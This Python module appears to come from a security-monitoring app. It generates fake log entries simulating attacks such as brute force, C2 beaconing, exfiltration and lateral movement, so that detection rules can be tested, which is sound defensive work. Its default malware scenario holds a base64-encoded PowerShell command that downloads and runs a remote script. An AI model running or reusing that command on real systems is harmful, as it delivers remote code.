from __future__ import annotations

from datetime import UTC
from datetime import datetime
from datetime import timedelta

from sqlalchemy.orm import Session

from app.crud.alert import create_alerts
from app.crud.log_entry import create_log_entries
from app.models.enums import AlertSeverity
from app.models.enums import AlertStatus
from app.models.enums import LogLevel
from app.models.log_entry import LogEntry
from app.services.correlation_service import correlate_alerts_into_incidents
from app.services.detection_service import run_detection_cycle


SIMULATION_SOURCE = "attack_simulator"


def _now() -> datetime:
    return datetime.now(UTC)


def _build_log(
    *,
    source: str,
    event_type: str,
    message: str,
    raw_log: str,
    severity: LogLevel,
    event_timestamp: datetime,
    endpoint_id: int | None,
    metadata_json: dict | None = None,
) -> LogEntry:
    return LogEntry(
        source=source,
        event_type=event_type,
        message=message,
        raw_log=raw_log,
        severity=severity,
        event_timestamp=event_timestamp,
        endpoint_id=endpoint_id,
        metadata_json=metadata_json or {},
    )


def simulate_brute_force(
    db: Session,
    *,
    username: str,
    source_ip: str,
    count: int = 10,
    endpoint_id: int | None = None,
    add_success: bool = True,
) -> list[LogEntry]:
    logs: list[LogEntry] = []
    base_time = _now() - timedelta(minutes=count * 2)

    for i in range(count):
        ts = base_time + timedelta(minutes=i * 2)
        msg = f"Failed login attempt for {username} from {source_ip}"
        raw = f"authd[{1000 + i}]: authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost={source_ip} user={username}"
        logs.append(
            _build_log(
                source=SIMULATION_SOURCE,
                event_type="authentication",
                message=msg,
                raw_log=raw,
                severity=LogLevel.WARNING,
                event_timestamp=ts,
                endpoint_id=endpoint_id,
                metadata_json={"username": username, "ip_address": source_ip, "action": "failed_login"},
            )
        )

    if add_success:
        success_ts = base_time + timedelta(minutes=count * 2 + 1)
        success_msg = f"Suspicious successful login for {username} from {source_ip}"
        success_raw = f"authd[{2000}]: authentication success; logname= uid=0 euid=0 tty=ssh rhost={source_ip} user={username}"
        logs.append(
            _build_log(
                source=SIMULATION_SOURCE,
                event_type="authentication",
                message=success_msg,
                raw_log=success_raw,
                severity=LogLevel.ERROR,
                event_timestamp=success_ts,
                endpoint_id=endpoint_id,
                metadata_json={"username": username, "ip_address": source_ip, "action": "successful_login"},
            )
        )

    return create_log_entries(db, logs)


def simulate_suspicious_login(
    db: Session,
    *,
    username: str,
    countries: list[str],
    ips: list[str],
    endpoint_id: int | None = None,
) -> list[LogEntry]:
    if len(countries) < 2 or len(ips) < 2:
        raise ValueError("At least 2 countries and 2 IPs are required for suspicious login simulation.")

    logs: list[LogEntry] = []
    base_time = _now() - timedelta(hours=4)

    # First login from country A / IP A
    logs.append(
        _build_log(
            source=SIMULATION_SOURCE,
            event_type="authentication",
            message=f"Successful login for {username} from {countries[0]}",
            raw_log=f"authd: authentication success; rhost={ips[0]} user={username} geo_country={countries[0]}",
            severity=LogLevel.INFO,
            event_timestamp=base_time,
            endpoint_id=endpoint_id,
            metadata_json={"username": username, "ip_address": ips[0], "country": countries[0]},
        )
    )

    # Second login from country B / IP B (within short window)
    logs.append(
        _build_log(
            source=SIMULATION_SOURCE,
            event_type="authentication",
            message=f"Successful login for {username} from {countries[1]}",
            raw_log=f"authd: authentication success; rhost={ips[1]} user={username} geo_country={countries[1]}",
            severity=LogLevel.INFO,
            event_timestamp=base_time + timedelta(minutes=30),
            endpoint_id=endpoint_id,
            metadata_json={"username": username, "ip_address": ips[1], "country": countries[1]},
        )
    )

    return create_log_entries(db, logs)


def simulate_port_scan(
    db: Session,
    *,
    target_ip: str,
    ports: list[int],
    source_ip: str,
    endpoint_id: int | None = None,
) -> list[LogEntry]:
    logs: list[LogEntry] = []
    base_time = _now() - timedelta(minutes=len(ports))

    for i, port in enumerate(ports):
        ts = base_time + timedelta(seconds=i * 3)
        msg = f"Connection attempt from {source_ip} to {target_ip}:{port}"
        raw = f"iptables: IN=eth0 OUT= MAC=00:00:00:00:00:00 SRC={source_ip} DST={target_ip} DPT={port} PROTO=TCP"
        logs.append(
            _build_log(
                source=SIMULATION_SOURCE,
                event_type="network",
                message=msg,
                raw_log=raw,
                severity=LogLevel.WARNING if port in [22, 3389, 445] else LogLevel.INFO,
                event_timestamp=ts,
                endpoint_id=endpoint_id,
                metadata_json={"source_ip": source_ip, "target_ip": target_ip, "port": port, "action": "connection_attempt"},
            )
        )

    return create_log_entries(db, logs)


def simulate_malware_beacon(
    db: Session,
    *,
    c2_ip: str,
    interval_minutes: int = 15,
    count: int = 8,
    endpoint_id: int | None = None,
) -> list[LogEntry]:
    logs: list[LogEntry] = []
    base_time = _now() - timedelta(minutes=interval_minutes * count)

    for i in range(count):
        ts = base_time + timedelta(minutes=i * interval_minutes)
        msg = f"Outbound connection to C2 server at {c2_ip}"
        raw = f"netfilter: OUT=eth0 SRC=192.168.1.100 DST={c2_ip} DPT=443 PROTO=TCP LEN=60"
        logs.append(
            _build_log(
                source=SIMULATION_SOURCE,
                event_type="network",
                message=msg,
                raw_log=raw,
                severity=LogLevel.WARNING,
                event_timestamp=ts,
                endpoint_id=endpoint_id,
                metadata_json={"c2_ip": c2_ip, "port": 443, "action": "outbound_connection", "beacon_sequence": i + 1},
            )
        )

    return create_log_entries(db, logs)


def simulate_data_exfiltration(
    db: Session,
    *,
    dest_ip: str,
    size_mb: int = 500,
    endpoint_id: int | None = None,
) -> list[LogEntry]:
    logs: list[LogEntry] = []
    base_time = _now() - timedelta(hours=2)
    chunks = max(3, min(10, size_mb // 100))

    for i in range(chunks):
        ts = base_time + timedelta(minutes=i * 10)
        chunk_size = size_mb // chunks
        msg = f"Large data transfer ({chunk_size}MB) to external host {dest_ip}"
        raw = f"firewall: OUT=eth0 SRC=10.0.0.5 DST={dest_ip} DPT=443 BYTES={chunk_size * 1024 * 1024} PROTO=TCP"
        logs.append(
            _build_log(
                source=SIMULATION_SOURCE,
                event_type="network",
                message=msg,
                raw_log=raw,
                severity=LogLevel.ERROR,
                event_timestamp=ts,
                endpoint_id=endpoint_id,
                metadata_json={"dest_ip": dest_ip, "bytes_transferred": chunk_size * 1024 * 1024, "action": "data_transfer"},
            )
        )

    return create_log_entries(db, logs)


def simulate_privilege_escalation(
    db: Session,
    *,
    username: str,
    technique: str = "sudo_abuse",
    endpoint_id: int | None = None,
) -> list[LogEntry]:
    logs: list[LogEntry] = []
    base_time = _now() - timedelta(minutes=15)

    # Initial low-priv activity
    logs.append(
        _build_log(
            source=SIMULATION_SOURCE,
            event_type="process",
            message=f"User {username} executed sudo -l",
            raw_log=f"sudo: {username} : TTY=pts/0 ; PWD=/home/{username} ; USER=root ; COMMAND=/bin/bash",
            severity=LogLevel.INFO,
            event_timestamp=base_time,
            endpoint_id=endpoint_id,
            metadata_json={"username": username, "action": "sudo_enumeration"},
        )
    )

    # Escalation attempt
    logs.append(
        _build_log(
            source=SIMULATION_SOURCE,
            event_type="process",
            message=f"Privilege escalation detected for {username} via {technique}",
            raw_log=f"auditd: type=SYSCALL msg=audit(1234567890.000:1): arch=c000003e syscall=59 success=yes uid=0 gid=0 exe=/bin/bash",
            severity=LogLevel.CRITICAL,
            event_timestamp=base_time + timedelta(minutes=5),
            endpoint_id=endpoint_id,
            metadata_json={"username": username, "technique": technique, "action": "privilege_escalation"},
        )
    )

    # Post-exploitation activity
    logs.append(
        _build_log(
            source=SIMULATION_SOURCE,
            event_type="process",
            message=f"Root shell spawned by {username}",
            raw_log=f"auditd: type=USER_START msg=audit(1234567890.000:2): pid=1 uid=0 auid={username} ses=1 msg='op=PAM:session_open grantors=pam_permit acct=root'",
            severity=LogLevel.CRITICAL,
            event_timestamp=base_time + timedelta(minutes=6),
            endpoint_id=endpoint_id,
            metadata_json={"username": username, "action": "root_shell"},
        )
    )

    return create_log_entries(db, logs)


def simulate_malware_execution(
    db: Session,
    *,
    process_name: str = "powershell.exe",
    command_line: str = "-enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=",
    endpoint_id: int | None = None,
) -> list[LogEntry]:
    logs: list[LogEntry] = []
    base_time = _now() - timedelta(minutes=12)

    # File drop
    logs.append(
        _build_log(
            source=SIMULATION_SOURCE,
            event_type="file",
            message=f"Suspicious file drop detected: C:\\Users\\Public\\{process_name}",
            raw_log=f"sysmon: EventID=11 Image={process_name} TargetFilename=C:\\Users\\Public\\{process_name}",
            severity=LogLevel.WARNING,
            event_timestamp=base_time,
            endpoint_id=endpoint_id,
            metadata_json={"process_name": process_name, "action": "file_drop", "mitre_technique": "T1059", "mitre_name": "Command and Scripting Interpreter"},
        )
    )

    # Process creation with encoded command
    logs.append(
        _build_log(
            source=SIMULATION_SOURCE,
            event_type="process",
            message=f"Suspicious process execution: {process_name} {command_line}",
            raw_log=f"sysmon: EventID=1 Image={process_name} CommandLine={command_line} User=DESKTOP-ABC123\\john",
            severity=LogLevel.ERROR,
            event_timestamp=base_time + timedelta(minutes=2),
            endpoint_id=endpoint_id,
            metadata_json={"process_name": process_name, "command_line": command_line, "action": "process_creation", "mitre_technique": "T1059", "mitre_name": "Command and Scripting Interpreter"},
        )
    )

    # Registry persistence
    logs.append(
        _build_log(
            source=SIMULATION_SOURCE,
            event_type="registry",
            message=f"Registry modification for persistence: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            raw_log=f"sysmon: EventID=13 Image=reg.exe TargetObject=HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run Details=C:\\Users\\Public\\{process_name}",
            severity=LogLevel.ERROR,
            event_timestamp=base_time + timedelta(minutes=4),
            endpoint_id=endpoint_id,
            metadata_json={"registry_path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "action": "registry_persistence", "mitre_technique": "T1547", "mitre_name": "Boot or Logon Autostart Execution"},
        )
    )

    # Network connection from spawned process
    logs.append(
        _build_log(
            source=SIMULATION_SOURCE,
            event_type="network",
            message=f"Outbound connection from {process_name} to 185.220.101.42:443",
            raw_log=f"sysmon: EventID=3 Image={process_name} DestinationIp=185.220.101.42 DestinationPort=443 Protocol=tcp",
            severity=LogLevel.CRITICAL,
            event_timestamp=base_time + timedelta(minutes=5),
            endpoint_id=endpoint_id,
            metadata_json={"process_name": process_name, "dest_ip": "185.220.101.42", "dest_port": 443, "action": "outbound_connection", "mitre_technique": "T1071", "mitre_name": "Application Layer Protocol"},
        )
    )

    return create_log_entries(db, logs)


def simulate_lateral_movement(
    db: Session,
    *,
    source_host: str = "WORKSTATION-01",
    target_host: str = "SERVER-DC01",
    username: str = "admin",
    endpoint_id: int | None = None,
) -> list[LogEntry]:
    logs: list[LogEntry] = []
    base_time = _now() - timedelta(minutes=20)

    # SMB connection to admin$
    logs.append(
        _build_log(
            source=SIMULATION_SOURCE,
            event_type="network",
            message=f"SMB connection from {source_host} to \\{target_host}\\ADMIN$",
            raw_log=f"security: EventID=5140 SubjectUserName={username} SourceAddress={source_host} ShareName=\\\\{target_host}\\ADMIN$",
            severity=LogLevel.WARNING,
            event_timestamp=base_time,
            endpoint_id=endpoint_id,
            metadata_json={"source_host": source_host, "target_host": target_host, "username": username, "action": "smb_share_access", "mitre_technique": "T1021.002", "mitre_name": "SMB/Windows Admin Shares"},
        )
    )

    # Service installation (PsExec-like behavior)
    logs.append(
        _build_log(
            source=SIMULATION_SOURCE,
            event_type="process",
            message=f"Service created on {target_host} by {username} from {source_host}",
            raw_log=f"system: EventID=7045 ServiceName=PSEXESVC ServiceFileName=C:\\Windows\\PSEXESVC.exe ServiceType=user mode service StartType=auto",
            severity=LogLevel.ERROR,
            event_timestamp=base_time + timedelta(minutes=3),
            endpoint_id=endpoint_id,
            metadata_json={"source_host": source_host, "target_host": target_host, "username": username, "action": "service_creation", "mitre_technique": "T1543.003", "mitre_name": "Windows Service"},
        )
    )

    # WMI execution
    logs.append(
        _build_log(
            source=SIMULATION_SOURCE,
            event_type="process",
            message=f"WMI process creation detected on {target_host}: wmic.exe /node:{target_host} process call create",
            raw_log=f"sysmon: EventID=1 Image=wmic.exe CommandLine=/node:{target_host} /user:{username} process call create \"cmd.exe /c whoami\"",
            severity=LogLevel.ERROR,
            event_timestamp=base_time + timedelta(minutes=6),
            endpoint_id=endpoint_id,
            metadata_json={"source_host": source_host, "target_host": target_host, "username": username, "action": "wmi_execution", "mitre_technique": "T1047", "mitre_name": "Windows Management Instrumentation"},
        )
    )

    # RDP connection from compromised account
    logs.append(
        _build_log(
            source=SIMULATION_SOURCE,
            event_type="authentication",
            message=f"RDP login for {username} from {source_host} to {target_host}",
            raw_log=f"security: EventID=4624 LogonType=10 IpAddress={source_host} WorkstationName={source_host} TargetUserName={username} TargetDomainName=CORP",
            severity=LogLevel.WARNING,
            event_timestamp=base_time + timedelta(minutes=8),
            endpoint_id=endpoint_id,
            metadata_json={"source_host": source_host, "target_host": target_host, "username": username, "action": "rdp_login", "mitre_technique": "T1021.001", "mitre_name": "Remote Desktop Protocol"},
        )
    )

    return create_log_entries(db, logs)


SCENARIO_DEFINITIONS = {
    "brute_force": {
        "label": "Brute Force Attack",
        "description": "Simulate repeated failed login attempts followed by a successful login.",
        "parameters": {
            "username": {"type": "string", "default": "admin", "label": "Target Username"},
            "source_ip": {"type": "string", "default": "192.168.1.100", "label": "Source IP"},
            "count": {"type": "integer", "default": 10, "min": 3, "max": 50, "label": "Failed Attempts"},
            "add_success": {"type": "boolean", "default": True, "label": "Add Successful Login"},
            "endpoint_id": {"type": "integer", "default": None, "label": "Endpoint ID (optional)", "optional": True},
        },
    },
    "suspicious_login": {
        "label": "Suspicious Login",
        "description": "Simulate logins from different countries/IPs for the same user.",
        "parameters": {
            "username": {"type": "string", "default": "admin", "label": "Target Username"},
            "countries": {"type": "string_list", "default": ["US", "RU"], "label": "Countries"},
            "ips": {"type": "string_list", "default": ["203.0.113.1", "198.51.100.2"], "label": "Source IPs"},
            "endpoint_id": {"type": "integer", "default": None, "label": "Endpoint ID (optional)", "optional": True},
        },
    },
    "port_scan": {
        "label": "Port Scan",
        "description": "Simulate a port scan across multiple target ports.",
        "parameters": {
            "target_ip": {"type": "string", "default": "10.0.0.5", "label": "Target IP"},
            "ports": {"type": "integer_list", "default": [22, 80, 443, 3389, 445, 3306, 5432, 8080], "label": "Ports"},
            "source_ip": {"type": "string", "default": "192.168.1.200", "label": "Source IP"},
            "endpoint_id": {"type": "integer", "default": None, "label": "Endpoint ID (optional)", "optional": True},
        },
    },
    "malware_beacon": {
        "label": "Malware Beacon",
        "description": "Simulate periodic outbound connections to a C2 server.",
        "parameters": {
            "c2_ip": {"type": "string", "default": "185.220.101.42", "label": "C2 Server IP"},
            "interval_minutes": {"type": "integer", "default": 15, "min": 1, "max": 120, "label": "Beacon Interval (min)"},
            "count": {"type": "integer", "default": 8, "min": 2, "max": 50, "label": "Beacon Count"},
            "endpoint_id": {"type": "integer", "default": None, "label": "Endpoint ID (optional)", "optional": True},
        },
    },
    "data_exfiltration": {
        "label": "Data Exfiltration",
        "description": "Simulate large data transfers to an external host.",
        "parameters": {
            "dest_ip": {"type": "string", "default": "45.142.212.100", "label": "Destination IP"},
            "size_mb": {"type": "integer", "default": 500, "min": 50, "max": 5000, "label": "Transfer Size (MB)"},
            "endpoint_id": {"type": "integer", "default": None, "label": "Endpoint ID (optional)", "optional": True},
        },
    },
    "privilege_escalation": {
        "label": "Privilege Escalation",
        "description": "Simulate privilege escalation from regular user to root.",
        "mitre_technique": "T1548",
        "mitre_name": "Abuse Elevation Control Mechanism",
        "parameters": {
            "username": {"type": "string", "default": "www-data", "label": "Target Username"},
            "technique": {"type": "string", "default": "sudo_abuse", "label": "Technique"},
            "endpoint_id": {"type": "integer", "default": None, "label": "Endpoint ID (optional)", "optional": True},
        },
    },
    "malware_execution": {
        "label": "Malware Execution",
        "description": "Simulate file drop, encoded PowerShell execution, registry persistence, and C2 beacon.",
        "mitre_technique": "T1059",
        "mitre_name": "Command and Scripting Interpreter",
        "parameters": {
            "process_name": {"type": "string", "default": "powershell.exe", "label": "Process Name"},
            "command_line": {"type": "string", "default": "-enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=", "label": "Command Line"},
            "endpoint_id": {"type": "integer", "default": None, "label": "Endpoint ID (optional)", "optional": True},
        },
    },
    "lateral_movement": {
        "label": "Lateral Movement",
        "description": "Simulate SMB admin share access, service creation, WMI execution, and RDP login.",
        "mitre_technique": "T1021",
        "mitre_name": "Remote Services",
        "parameters": {
            "source_host": {"type": "string", "default": "WORKSTATION-01", "label": "Source Host"},
            "target_host": {"type": "string", "default": "SERVER-DC01", "label": "Target Host"},
            "username": {"type": "string", "default": "admin", "label": "Username"},
            "endpoint_id": {"type": "integer", "default": None, "label": "Endpoint ID (optional)", "optional": True},
        },
    },
}


def run_simulation(
    db: Session,
    *,
    scenario: str,
    parameters: dict,
    trigger_detection: bool = True,
    auto_correlate: bool = True,
) -> dict:
    if scenario not in SCENARIO_DEFINITIONS:
        raise ValueError(f"Unknown scenario: {scenario}")

    if scenario == "brute_force":
        logs = simulate_brute_force(
            db,
            username=parameters.get("username", "admin"),
            source_ip=parameters.get("source_ip", "192.168.1.100"),
            count=parameters.get("count", 10),
            add_success=parameters.get("add_success", True),
            endpoint_id=parameters.get("endpoint_id"),
        )
    elif scenario == "suspicious_login":
        logs = simulate_suspicious_login(
            db,
            username=parameters.get("username", "admin"),
            countries=parameters.get("countries", ["US", "RU"]),
            ips=parameters.get("ips", ["203.0.113.1", "198.51.100.2"]),
            endpoint_id=parameters.get("endpoint_id"),
        )
    elif scenario == "port_scan":
        logs = simulate_port_scan(
            db,
            target_ip=parameters.get("target_ip", "10.0.0.5"),
            ports=parameters.get("ports", [22, 80, 443, 3389, 445, 3306, 5432, 8080]),
            source_ip=parameters.get("source_ip", "192.168.1.200"),
            endpoint_id=parameters.get("endpoint_id"),
        )
    elif scenario == "malware_beacon":
        logs = simulate_malware_beacon(
            db,
            c2_ip=parameters.get("c2_ip", "185.220.101.42"),
            interval_minutes=parameters.get("interval_minutes", 15),
            count=parameters.get("count", 8),
            endpoint_id=parameters.get("endpoint_id"),
        )
    elif scenario == "data_exfiltration":
        logs = simulate_data_exfiltration(
            db,
            dest_ip=parameters.get("dest_ip", "45.142.212.100"),
            size_mb=parameters.get("size_mb", 500),
            endpoint_id=parameters.get("endpoint_id"),
        )
    elif scenario == "privilege_escalation":
        logs = simulate_privilege_escalation(
            db,
            username=parameters.get("username", "www-data"),
            technique=parameters.get("technique", "sudo_abuse"),
            endpoint_id=parameters.get("endpoint_id"),
        )
    elif scenario == "malware_execution":
        logs = simulate_malware_execution(
            db,
            process_name=parameters.get("process_name", "powershell.exe"),
            command_line=parameters.get("command_line", "-enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA="),
            endpoint_id=parameters.get("endpoint_id"),
        )
    elif scenario == "lateral_movement":
        logs = simulate_lateral_movement(
            db,
            source_host=parameters.get("source_host", "WORKSTATION-01"),
            target_host=parameters.get("target_host", "SERVER-DC01"),
            username=parameters.get("username", "admin"),
            endpoint_id=parameters.get("endpoint_id"),
        )
    else:
        logs = []

    alert_ids: list[int] = []
    incident_ids: list[int] = []
    if trigger_detection and logs:
        alerts, _, _, _, _ = run_detection_cycle(db, hours=6)
        alert_ids = [a.id for a in alerts]

        if auto_correlate and alert_ids:
            incidents = correlate_alerts_into_incidents(db, hours=6)
            incident_ids = [inc.id for inc in incidents]

    return {
        "scenario": scenario,
        "logs_created": len(logs),
        "alert_ids": alert_ids,
        "incident_ids": incident_ids,
        "mitre_technique": SCENARIO_DEFINITIONS[scenario].get("mitre_technique"),
        "mitre_name": SCENARIO_DEFINITIONS[scenario].get("mitre_name"),
        "summary": f"Simulated {scenario.replace('_', ' ')} attack: {len(logs)} logs generated, {len(alert_ids)} alerts triggered, {len(incident_ids)} incidents correlated.",
    }

